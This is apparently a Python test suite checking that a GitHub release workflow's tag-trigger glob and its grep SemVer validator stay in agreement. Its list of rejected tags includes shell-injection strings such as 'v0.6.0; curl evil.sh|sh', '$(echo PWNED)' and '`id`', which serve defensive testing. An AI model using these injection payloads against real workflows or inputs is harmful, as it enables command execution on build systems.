"""The release trigger and the release tag validator must agree.

`.github/workflows/release.yml` filters tag pushes with a glob and then re-validates the tag
with `grep -Eq`. Those two have disagreed twice:

* the glob was `v*`, which also matched the floating major-version tag the published action
  uses (`ci@v1`), so re-pointing it started a release that then failed validation;
* the validator was `([-+][0-9A-Za-z.]+)?`, a SemVer subset that rejected legitimate
  `v1.2.3-rc-1` and `v1.2.3-rc.1+build.7`.

Both produce the same failure mode: a push that satisfies the trigger, starts a privileged
release run, and dies on validation. This test reads both out of the workflow and asserts
they cannot drift apart again.
"""
from __future__ import annotations

import os
import re
import subprocess
import tempfile
import textwrap
import unittest
from pathlib import Path

WORKFLOW = Path(__file__).resolve().parents[1] / ".github/workflows/release.yml"

# Ground truth: the official regex published at semver.org. Hand-written example lists keep
# missing cases -- the first validator missed hyphens in prerelease identifiers, the second
# missed the rule that *numeric* prerelease identifiers may not have leading zeroes. So the
# workflow's pattern is cross-checked against the spec over a generated corpus instead.
OFFICIAL_SEMVER = re.compile(
    r"^(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)"
    r"(?:-(?:(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)"
    r"(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?"
    r"(?:\+(?:[0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$"
)

_CORES = ["1.2.3", "0.0.4", "10.20.30", "0.0.0", "01.2.3", "1.02.3", "1.2.03"]
_PRES = ["", "-rc.1", "-rc-1", "-alpha", "-alpha.beta", "-0.3.7", "-0A", "-x.7.z.92",
         "-alpha.0valid", "-01", "-alpha.01", "-01.2", "-", "-.", "-alpha..1"]
_BUILDS = ["", "+build.7", "+build.01", "+21AF26D3-117B344092BD", "+", "+.", "+build..7"]


def _semver_corpus():
    """Every core x prerelease x build combination, with the spec's verdict for each."""
    for core in _CORES:
        for pre in _PRES:
            for build in _BUILDS:
                body = core + pre + build
                yield "v" + body, bool(OFFICIAL_SEMVER.match(body))


# Tags that are valid SemVer releases: the trigger should fire AND the validator accept.
VALID = [t for t, ok in _semver_corpus() if ok]
# Non-releases and shell-injection payloads a crafted workflow_dispatch input could supply.
# These are not SemVer at all, so they are listed rather than generated.
INVALID = [t for t, ok in _semver_corpus() if not ok] + [
    "v1", "v2", "v1.2", "vnext", "main", "master", "HEAD", "", "v", "1.2.3",
    "v1.2.3 ", " v1.2.3",
    'v0.6.0"; echo PWNED; "', "$(echo PWNED)", "v0.6.0; curl evil.sh|sh",
    "v1.2.3&&whoami", "v1.2.3`id`", "v1.2.3\nv9.9.9",
]


def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def _trigger_globs() -> list[str]:
    """The `on.push.tags` globs, read straight out of the YAML (no yaml dependency)."""
    text = _workflow_text()
    block = re.search(r"^\s*tags:\s*$(.*?)^\s*workflow_dispatch:", text,
                      re.MULTILINE | re.DOTALL)
    assert block, "could not locate on.push.tags in release.yml"
    return re.findall(r'^\s*-\s*"([^"]+)"', block.group(1), re.MULTILINE)


def _glob_matches(glob: str, ref: str) -> bool:
    """GitHub ref filters: '*' matches any character except '/'."""
    rx = "^" + "".join("[^/]*" if c == "*" else re.escape(c) for c in glob) + "$"
    return re.match(rx, ref) is not None


def _triggers(ref: str) -> bool:
    return any(_glob_matches(g, ref) for g in _trigger_globs())


def _validation_script() -> str:
    """The full `run:` body of the tag-resolution step, verbatim from the workflow."""
    m = re.search(
        r"- name: Resolve and validate release tag.*?\n        run: \|\n(.*?)\n      - name: ",
        _workflow_text(), re.DOTALL)
    assert m, "could not locate the tag-validation run: block in release.yml"
    body = textwrap.dedent(m.group(1))
    assert "grep -Eq" in body, "extracted block does not contain the validator"
    return body


def _validator_regex() -> str:
    """The ERE passed to grep in the tag-validation step.

    Anchored on the `if ! printf` line, not on any `grep -E` occurrence: a comment that
    merely mentioned a pattern once caused this to extract '^v...$' from prose, and every
    assertion then silently validated that instead of the real validator. The structural
    sanity checks below exist so that failure mode is loud rather than green.
    """
    m = re.search(r"if ! printf '%s' \"\$tag\" \| grep -Eq '([^']+)'", _workflow_text())
    assert m, "could not locate the grep -Eq tag validator in release.yml"
    rx = m.group(1)
    assert rx.startswith("^v") and rx.endswith("$"), f"validator not anchored: {rx!r}"
    assert len(rx) > 60, f"validator suspiciously short -- extracted from prose? {rx!r}"
    assert "[1-9]" in rx, f"validator lacks a SemVer numeric rule -- wrong match? {rx!r}"
    return rx


def _accepts(tag: str) -> bool:
    """Run the workflow's own validation, in a real shell, exactly as CI would.

    Python's ``re`` is NOT the production engine and disagrees with it: ``grep`` is
    line-oriented, so an anchored pattern matches if *any* line matches. Asserting through
    ``re`` previously claimed a multiline payload was rejected when the real script accepted
    it. ``git`` is stubbed so only the validation logic is under test.
    """
    with tempfile.TemporaryDirectory() as tmp:
        stub = Path(tmp) / "git"
        stub.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        stub.chmod(0o755)
        env = {
            "PATH": f"{tmp}{os.pathsep}{os.environ.get('PATH', '')}",
            "EVENT_NAME": "workflow_dispatch",
            "INPUT_TAG": tag,
            "GITHUB_OUTPUT": str(Path(tmp) / "out"),
        }
        proc = subprocess.run(["bash", "-c", _validation_script()], env=env,
                              capture_output=True, text=True)
        return proc.returncode == 0


def _grep_accepts_all(tags):
    """Accept-set for newline-free tags via one real `grep -E` pass (fast bulk check)."""
    rx = _validator_regex()
    payload = "\n".join(tags) + "\n"
    proc = subprocess.run(["grep", "-E", rx], input=payload, capture_output=True, text=True)
    return set(proc.stdout.splitlines())


class TestReleaseTagPolicy(unittest.TestCase):
    def test_workflow_pieces_are_found(self):
        # Guard against the extraction silently returning nothing and passing vacuously.
        self.assertTrue(_trigger_globs(), "no tag globs extracted")
        self.assertTrue(_validator_regex().startswith("^v"), "no validator regex extracted")

    def test_corpus_is_non_trivial(self):
        # Both lists must be populated, or the assertions below pass vacuously.
        self.assertGreater(len(VALID), 50, "generated valid-tag corpus is suspiciously small")
        self.assertGreater(len(INVALID), 50, "generated invalid-tag corpus is suspiciously small")

    def test_validator_agrees_with_the_official_semver_regex(self):
        """The workflow's ERE must classify every generated tag exactly as the spec does.

        Run through real ``grep -E`` -- the production engine -- not Python's ``re``.
        """
        corpus = list(_semver_corpus())
        accepted = _grep_accepts_all([t for t, _ in corpus])
        disagreements = [
            f"{tag} (spec={spec}, workflow={tag in accepted})"
            for tag, spec in corpus if (tag in accepted) != spec
        ]
        self.assertEqual(
            disagreements, [],
            f"validator disagrees with SemVer 2.0.0 on {len(disagreements)} tag(s):\n  "
            + "\n  ".join(disagreements[:20]),
        )

    def test_validator_accepts_every_valid_semver_tag(self):
        accepted = _grep_accepts_all(VALID)
        rejected = [t for t in VALID if t not in accepted]
        self.assertEqual(rejected, [], f"validator rejects valid SemVer tags: {rejected}")

    def test_validator_rejects_non_releases_and_injection_payloads(self):
        """Driven through the real script, so control characters are covered too."""
        newline_free = [t for t in INVALID if "\n" not in t and "\r" not in t]
        accepted = _grep_accepts_all(newline_free) if newline_free else set()
        wrongly = [t for t in newline_free if t in accepted]
        self.assertEqual(wrongly, [], f"validator accepts tags it must refuse: {wrongly}")

    def test_script_rejects_control_characters(self):
        """grep is line-oriented, so the anchored pattern alone is not sufficient.

        ``printf '%s' 'v1.2.3\\nv9.9.9' | grep -Eq '^v...$'`` succeeds on the first line.
        git forbids control characters in refnames so a tag push cannot carry one, but
        workflow_dispatch input is free-form -- the script must reject it itself.
        """
        for payload in ["v1.2.3\nv9.9.9", "v9.9.9\nv1.2.3", "not-a-tag\nv1.2.3",
                        "v1.2.3\r", "v1.2.3\rv9.9.9", "v1.2.3\n"]:
            with self.subTest(payload=payload):
                self.assertFalse(_accepts(payload),
                                 f"script accepted a control-character payload: {payload!r}")

    def test_script_accepts_real_tags_and_rejects_plain_bad_ones(self):
        """End-to-end sanity on the extracted script itself, not just its regex."""
        for tag in ["v1.2.3", "v1.2.3-rc.1", "v1.2.3-rc-1", "v1.2.3-rc.1+build.7"]:
            with self.subTest(tag=tag):
                self.assertTrue(_accepts(tag), f"script rejected a valid tag: {tag}")
        for tag in ["v1", "v1.2", "main", "v01.2.3", "v1.2.3-01", 'v0.6.0"; echo PWNED; "']:
            with self.subTest(tag=tag):
                self.assertFalse(_accepts(tag), f"script accepted an invalid tag: {tag}")

    def test_no_legitimate_tag_triggers_a_run_it_cannot_pass(self):
        """The invariant that broke twice.

        A push that satisfies the trigger, starts a privileged release run and then dies on
        validation is a red X on a legitimate action. Scoped to real SemVer tags on purpose:
        a malformed or hostile ref (``v01.2.3``, ``v1.2.3`id```) matching the glob and then
        being refused by the validator is defence in depth, not a disagreement.
        """
        accepted = _grep_accepts_all(VALID)
        disagree = [t for t in VALID if _triggers(t) and t not in accepted]
        self.assertEqual(
            disagree, [],
            "these valid tags start a release run and then fail validation: " + repr(disagree),
        )

    def test_hostile_refs_matching_the_glob_are_still_refused(self):
        """The flip side: the glob is not a security boundary, the validator is.

        Control-character payloads go through the extracted script, because the anchored
        match alone accepts them -- that is the whole reason the charset guard exists.
        """
        slipped = [t for t in INVALID if _triggers(t)]
        self.assertTrue(slipped, "expected some hostile refs to match the glob")
        printable = [t for t in slipped if "\n" not in t and "\r" not in t]
        control = [t for t in slipped if t not in printable]
        accepted = _grep_accepts_all(printable) if printable else set()
        still_accepted = [t for t in printable if t in accepted]
        still_accepted += [t for t in control if _accepts(t)]
        self.assertEqual(still_accepted, [],
                         f"hostile refs passed the validator: {still_accepted}")

    def test_trigger_still_fires_for_real_releases(self):
        """The narrowing must not have gone so far that releases stop happening."""
        missed = [t for t in VALID if not _triggers(t)]
        self.assertEqual(missed, [], f"trigger no longer fires for real releases: {missed}")

    def test_floating_major_version_tags_are_ignored(self):
        """`ci@v1` is re-pointed as routine action maintenance; it must not start a release."""
        for tag in ("v1", "v2", "v10"):
            self.assertFalse(_triggers(tag), f"{tag} must not trigger the release workflow")


if __name__ == "__main__":
    unittest.main()
